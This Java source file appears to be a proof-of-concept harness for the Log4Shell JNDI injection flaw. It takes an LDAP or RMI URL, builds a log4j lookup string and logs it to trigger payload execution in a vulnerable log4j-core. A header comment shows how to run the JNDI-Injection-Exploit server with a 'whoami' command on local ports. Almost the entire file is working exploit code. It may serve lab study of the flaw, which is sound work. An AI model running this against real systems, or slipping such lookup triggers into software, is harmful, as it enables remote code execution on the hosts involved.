package lu.xlm;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.lookup.CustomJndiLookup;

/**
 * POC to retrieve the payload from a LDAP/RMI server in a log4shell context.
 * Use the code of a vulnerable version of log4j-core.
 * <p>
 * Test srv:
 * <code>java -jar JNDI-Injection-Exploit.jar -C "whoami" -J 127.0.0.1:9999 -L 127.0.0.1:9998 -R 127.0.0.1:9997</code>
 *
 * @see "https://github.com/apache/logging-log4j2/blob/master/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java"
 */
public class EntryPoint {

    private static final String SERIALIZED_DATA = "javaSerializedData";
    private static final String CLASS_NAME = "javaClassName";
    private static final String REFERENCE_ADDRESS = "javaReferenceAddress";
    private static final String OBJECT_FACTORY = "javaFactory";

    public static void main(String[] args) throws Exception {
        if (args == null || args.length == 0) {
            MsgUtils.print(true, "Missing LDAP/LDAPS/RMI URL!");
            MsgUtils.print(false, "URL: jndi:rmi://127.0.0.1:9997/gchero");
            MsgUtils.print(false, "URL: jndi:ldap://127.0.0.1:9998/gcherG");
            MsgUtils.print(false, "URL: rmi://127.0.0.1:9997/gchero");
            MsgUtils.print(false, "URL: ldap://127.0.0.1:9998/gcherG");
        } else {
            String key = args[0];
            if (!key.startsWith("jndi:")) {
                key = "jndi:" + key;
            }
            Logger log = LogManager.getRootLogger();
            String jndiName = CustomJndiLookup.convertJndiName(key);
            MsgUtils.print(true, "Target:\n" + jndiName);
            MsgUtils.print(true, "Trigger payload execution.");
            log.info(String.format("${xlm%s}", jndiName));
        }
    }

}
